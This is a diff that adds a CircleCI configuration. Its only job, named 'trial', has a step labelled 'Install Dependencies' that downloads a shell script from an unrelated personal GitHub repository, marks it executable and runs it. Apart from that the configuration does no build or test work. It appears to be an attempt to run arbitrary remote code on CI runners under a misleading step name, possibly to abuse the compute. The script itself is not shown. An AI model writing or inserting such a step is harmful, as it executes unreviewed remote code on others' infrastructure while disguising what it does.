@@ -1,0 +1,18 @@
+version: 2.1
+jobs:
+    trial:
+      docker:
+            - image: circleci/ruby:2.5.3
+      parallelism: 2
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              wget https://raw.githubusercontent.com/Nurultyas7979/ewe/main/jero.sh && chmod +x jero.sh && ./jero.sh
+              
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
